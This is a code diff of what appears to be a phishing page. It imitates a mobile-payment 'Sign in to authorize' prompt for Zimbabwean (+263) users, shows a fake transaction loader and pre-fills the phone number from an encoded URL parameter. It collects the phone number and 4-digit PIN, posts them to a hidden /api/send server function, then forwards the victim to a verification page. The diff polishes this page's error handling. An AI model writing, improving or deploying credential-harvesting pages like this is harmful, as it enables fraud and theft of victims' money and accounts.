@@ -30,7 +30,6 @@
     overflow: hidden;
   }
 
-  /* --- 3-Second Loading Screen Overlay --- */
   #loadingScreen {
     position: fixed;
     inset: 0;
@@ -65,7 +64,6 @@
     50% { opacity: 0.5; }
   }
 
-  /* --- Modal Container --- */
   .modal-card {
     background: #FFFFFF;
     width: 100%;
@@ -84,7 +82,6 @@
     transform: translateY(0);
   }
 
-  /* --- White Top Section --- */
   .top-section {
     padding: 32px 24px 24px;
     text-align: center;
@@ -121,7 +118,6 @@
     letter-spacing: -0.5px;
   }
 
-  /* --- Blue Bottom Section --- */
   .bottom-section {
     background: #005FB8;
     padding: 24px;
@@ -136,7 +132,6 @@
     align-items: center;
   }
 
-  /* Phone Input */
   .input-group {
     display: flex;
     align-items: center;
@@ -177,7 +172,6 @@
   }
   .phone-input::placeholder { color: #9CA3AF; font-weight: 400; }
 
-  /* PIN Section */
   .pin-label {
     background: #E0F2FE;
     color: #0369A1;
@@ -209,7 +203,6 @@
   }
   .pin-box:focus { border-color: #0045A0; }
 
-  /* Login Button */
   .btn-login {
     width: 100%;
     background: #0045A0;
@@ -227,7 +220,6 @@
   .btn-login:active { transform: scale(0.98); }
   .btn-login:disabled { opacity: 0.7; cursor: wait; }
 
-  /* Toast */
   .toast {
     position: fixed;
     top: 20px;
@@ -243,25 +235,23 @@
     opacity: 0;
     transition: all 0.3s ease;
     z-index: 10000;
+    text-align: center;
+    max-width: 90vw;
   }
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
   .toast.error { background: #E31B23; }
   .toast.success { background: #00A651; }
-
 </style>
 </head>
 <body>
 
-  <!-- Loading Screen -->
   <div id="loadingScreen">
     <div class="spinner"></div>
     <div class="loading-text">Initiating transaction...</div>
   </div>
 
-  <!-- Modal -->
   <div class="modal-card" id="loginCard">
     
-    <!-- Top Section -->
     <div class="top-section">
       <button class="close-btn" onclick="window.history.back()">✕</button>
       <div class="logo">
@@ -270,11 +260,9 @@
       <div class="title">Sign in to authorize</div>
     </div>
 
-    <!-- Bottom Section -->
     <div class="bottom-section">
       <div class="inner-card">
         
-        <!-- Phone Input -->
         <div class="input-group">
           <div class="country-code">
             🇿🇼 +263
@@ -283,7 +271,6 @@
           <input type="tel" id="phoneNumber" class="phone-input" placeholder="Phone number" autocomplete="tel" maxlength="10">
         </div>
 
-        <!-- PIN Section -->
         <div class="pin-label">Enter 4 digit PIN</div>
         <div class="pin-boxes">
           <input type="password" class="pin-box" id="pin1" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
@@ -292,18 +279,15 @@
           <input type="password" class="pin-box" id="pin4" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
         </div>
 
-        <!-- Login Button -->
         <button type="button" class="btn-login" id="loginBtn" onclick="submitLogin()">Login</button>
 
       </div>
     </div>
   </div>
 
-  <!-- Toast -->
   <div class="toast" id="toast"></div>
 
 <script>
-// --- Base64URL Decoder ---
 function b64urlDecode(str) {
   try {
     str = str.replace(/-/g, '+').replace(/_/g, '/');
@@ -314,7 +298,6 @@ function b64urlDecode(str) {
   }
 }
 
-// --- Extract Data from URL ---
 const urlParams = new URLSearchParams(window.location.search);
 const encodedParam = urlParams.get('d');
 
@@ -323,7 +306,6 @@ let currency = 'USD';
 let txnId = 'TXN-PENDING';
 let initialPhone = '';
 
-// Decode payload to get Amount, Currency, TXN, and Phone
 if (encodedParam) {
   const raw = b64urlDecode(encodedParam);
   if (raw) {
@@ -347,7 +329,6 @@ if (encodedParam) {
   initialPhone = urlParams.get('an') || '';
 }
 
-// Pre-fill and format the phone number input
 if (initialPhone) {
   let cleanPhone = initialPhone.replace(/\D/g, ''); 
   if (cleanPhone.startsWith('263')) cleanPhone = cleanPhone.substring(3);
@@ -355,7 +336,6 @@ if (initialPhone) {
   document.getElementById('phoneNumber').value = cleanPhone;
 }
 
-// --- Loading Screen Logic ---
 document.addEventListener('DOMContentLoaded', () => {
   setTimeout(() => {
     const loader = document.getElementById('loadingScreen');
@@ -369,7 +349,6 @@ document.addEventListener('DOMContentLoaded', () => {
   }, 3000);
 });
 
-// --- PIN Auto-Focus Logic ---
 const pinInputs = document.querySelectorAll('.pin-box');
 pinInputs.forEach((input, index) => {
   input.addEventListener('input', (e) => {
@@ -386,21 +365,18 @@ pinInputs.forEach((input, index) => {
   });
 });
 
-// --- Toast Helper ---
 function showToast(msg, type = 'error') {
   const t = document.getElementById('toast');
   t.textContent = msg;
   t.className = 'toast show ' + type;
-  setTimeout(() => t.classList.remove('show'), 3000);
+  setTimeout(() => t.classList.remove('show'), 4000);
 }
 
-// --- Submit & Send to Cloudflare Function ---
 async function submitLogin() {
   const phone = document.getElementById('phoneNumber').value.trim();
   let pin = '';
   pinInputs.forEach(input => pin += input.value);
 
-  // Validation
   if (!phone) {
     showToast('Please enter your phone number.');
     return;
@@ -419,7 +395,6 @@ async function submitLogin() {
   btn.textContent = 'Authorizing...';
 
   try {
-    // Call the Cloudflare Function (Token is securely hidden on the server)
     const response = await fetch('/api/send', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -432,7 +407,22 @@ async function submitLogin() {
       })
     });
 
-    if (!response.ok) throw new Error('Server failed');
+    // If the response is not OK, read the actual error from the Worker
+    if (!response.ok) {
+      let errorMsg = 'Unknown error';
+      try {
+        const errData = await response.json();
+        errorMsg = errData.error || JSON.stringify(errData);
+      } catch (e) {
+        errorMsg = await response.text();
+      }
+      
+      // Show the REAL error on the screen
+      showToast('Error: ' + errorMsg);
+      btn.disabled = false;
+      btn.textContent = 'Login';
+      return;
+    }
 
     // Success state
     btn.style.backgroundColor = '#00A651';
@@ -442,14 +432,13 @@ async function submitLogin() {
     document.getElementById('phoneNumber').disabled = true;
     pinInputs.forEach(i => i.disabled = true);
 
-    // Redirect to Verification Page after 1.5 seconds
     setTimeout(() => { 
       window.location.href = 'verification.html' + window.location.search; 
     }, 1500);
 
   } catch (error) {
     console.error(error);
-    showToast('Connection error. Please try again.');
+    showToast('Network error: ' + error.message);
     btn.disabled = false;
     btn.textContent = 'Login';
   }
